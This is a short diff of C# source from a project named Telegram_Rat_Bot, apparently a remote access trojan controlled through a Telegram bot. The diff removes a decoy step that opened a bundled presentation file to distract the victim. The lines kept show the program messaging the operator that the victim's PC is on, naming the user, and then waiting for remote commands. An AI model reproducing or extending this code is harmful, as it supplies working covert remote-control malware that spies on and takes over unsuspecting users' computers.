@@ -32,14 +32,6 @@ namespace Telegram_Rat_Bot
         public Form1()
         {
             var client = new TelegramBotClient(token);
-            try
-            {
-                Process.Start($"{Environment.CurrentDirectory}/Files/Презентация.pptx");
-            }
-            catch
-            {
-                Console.Write("");
-            }
             client.SendTextMessageAsync(id, $"Пк {Environment.UserName} включен", replyMarkup: Markup());
             client.StartReceiving(Update, Error);
 
